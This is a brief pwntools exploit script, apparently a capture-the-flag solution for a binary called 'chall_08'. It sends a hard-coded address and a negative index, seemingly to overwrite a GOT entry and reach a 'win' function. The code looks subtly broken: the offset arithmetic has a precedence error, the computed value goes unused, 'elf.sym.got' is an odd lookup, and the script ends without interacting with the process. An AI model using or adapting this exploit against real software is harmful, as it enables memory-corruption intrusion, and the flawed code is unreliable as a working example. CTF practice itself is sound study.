from pwn import *

# Load the binary
elf = ELF("./chall_08")

# Calculate the offset to the target function from puts in terms of 8 bytes (64-bit)
offset_to_target = elf.sym.target - elf.sym.got['puts'] // 8

# Print the calculated offset for debugging
print("Offset to target:", offset_to_target)

# Start the process
p = process("./chall_08")

# Send the first payload (offset to target function)
p.sendline("4198950".encode())

# Send the second payload (negative offset to target function)
p.sendline("-7".encode())

# Print the address of the win function for reference
print("Win function address:", elf.sym.win)